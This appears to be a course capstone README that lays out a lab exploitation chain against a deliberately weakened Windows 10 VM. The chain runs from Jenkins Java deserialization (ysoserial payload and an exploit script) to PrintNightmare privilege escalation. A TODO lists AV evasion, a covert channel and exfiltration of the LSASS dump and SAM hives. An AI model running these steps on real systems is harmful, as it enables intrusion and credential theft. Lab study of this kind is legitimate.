
# CS 564 Capstone Project
- Team Cryptid

# Info
- Target             : Windows 10
- Initial Compromise : Java Deserialization in Jenkins <= 1.638 (CVE-2015-8103)
- Priv Esc           : Printer Nightmare (CVE-2021-34527)
- Purpose            : Obtain local/domain credentials + other sensitive files

## Setup vulnerable windows VM
- Install Windows 10 VM
- Disable Windows firewall
- Set the following registry values at HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint:
    - RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    - NoWarningNoElevationOnInstall                 REG_DWORD    0x1
- Donwload and install JDK 11 from https://aka.ms/download-jdk/microsoft-jdk-11.0.22-windows-x64.msi
    - Make sure to enable the option to add JAVA_HOME to the PATH
    - You can run `java --version` in the Windows Command prompt to see if it installed properly
- Download vulnerable Jenkins version from https://get.jenkins.io/war/1.625/
- To run Jenkins, execute `java -jar /path/to/jenkins.war`
- Now Jenkins should be running on port 8080

## Running the Exploit
- Generate serialized java payload: https://github.com/frohoff/ysoserial
    - `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`
    - Example payload that executes the calcualtor app on the target:
    - `java -jar ysoserial-all.jar CommonsCollections7 calc.exe > payload`
- Python exploit script:
    - https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
- Run `python exploit.py [IP] [PORT] /path/to/payload`
    - Might need to run a few times to get the RCE to work
- Other Jenkins vulns here:
    - https://github.com/gquere/pwn_jenkins

## TODO
- Obfuscation
    - Virtual instruction based: https://github.com/JonathanSalwan/Tigress_protection/tree/master
    - Loader + decryptor / packing
    - Lots of ideas here: https://book.hacktricks.xyz/windows-hardening/av-bypass
- Remove / comment out debugging print statements
- Covert comm channel
- What data do we want to exfiltrate?
    - LSASS.exe dump
    - SAM / SECURITY hives
    
 
